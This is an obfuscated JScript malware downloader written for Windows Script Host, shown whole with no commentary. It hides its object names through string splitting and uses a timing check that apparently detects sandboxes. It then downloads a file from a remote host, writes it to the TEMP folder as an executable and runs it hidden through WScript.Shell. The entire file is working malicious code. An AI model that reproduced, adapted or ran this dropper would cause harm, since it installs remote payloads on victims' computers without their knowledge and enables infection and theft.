var EP = false;
var DO = "Create"+"Object";
var GX = function H() {return WScript[DO]("WScript"+".Shell");}(), D = 11;
var N = "MSXML2"+".XMLHTTP";
var Z = 2;
var DF = Z - 2;
function BW(TP){GX["Run"](TP, DF, DF);};
function B(){return N + "";};
function S(NK, KH){DF = DF * 1; return NK - KH;};
function OA(){return DO;};
/*@cc_on
  @if (@_win32 || @_win64)
    EP = true;
  @end
@*/
if (EP)
{
var A = "";
function QG(){return 22;};
var I = 0; var LF = 0;
function G()
{
var DR = new this["Date"]();
var CP = DR["getUTCMilliseconds"]();
WScript["Sleep"](QG());
var DR = new this["Date"]();
var ND = DR["getUTCMilliseconds"]();
WScript["Sleep"](QG());
var DR = new this["Date"]();
var A0 = DR["getUTCMilliseconds"]();
var I = "K";
I = S(ND, CP);
var LF = "X";
LF = S(A0, ND);
A = "open";
return S(I, LF);
}
var O = false;
var O0 = false;
for (var F = DF; F < QG() * 1; F++){if (G() != DF){
O = true; 
LF = "31" + 11 * I + LF; 
O0 = true; 
break;
}}
function C() {return ((O == true) && (O == O0)) ? 1 : DF;};
if (O && C() && O0){
function T() {return GX["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "NacvTykJR.ex" + "e";};
 DX = B();
 K0 = WScript[DO](DX);
 var EU = 1;
do { 
	for (;EU;){
	try {
		if (EU == 1)
		{
			K0[A]("GET", "http://ekotrade.pl/m4ujda", false);
			K0["send"]();
			ZD = "Sleep";
			EU = 2;
		}
		WScript[ZD](QG() + 120); 
		if (K0["readystate"] < 2 * 2) continue;
		EU = DF;
		function EI(T0) {var WU = (1, 2, 3, 4, 5, T0); return WU;};
		GQ = WScript[OA()]("ADODB.Stream");
		DX = GQ;
		DX[A]();
		DX["type"] = EI(1);
		DX["write"](K0["ResponseBody"]);
		GQ["position"] = EI(DF);
		DX["Save" + "ToFile"](T(), 2);
		GQ["cl"+"ose"]();
		KX = T();
		BW(KX);
	} catch(NT){};};
}while (EU);
}
}

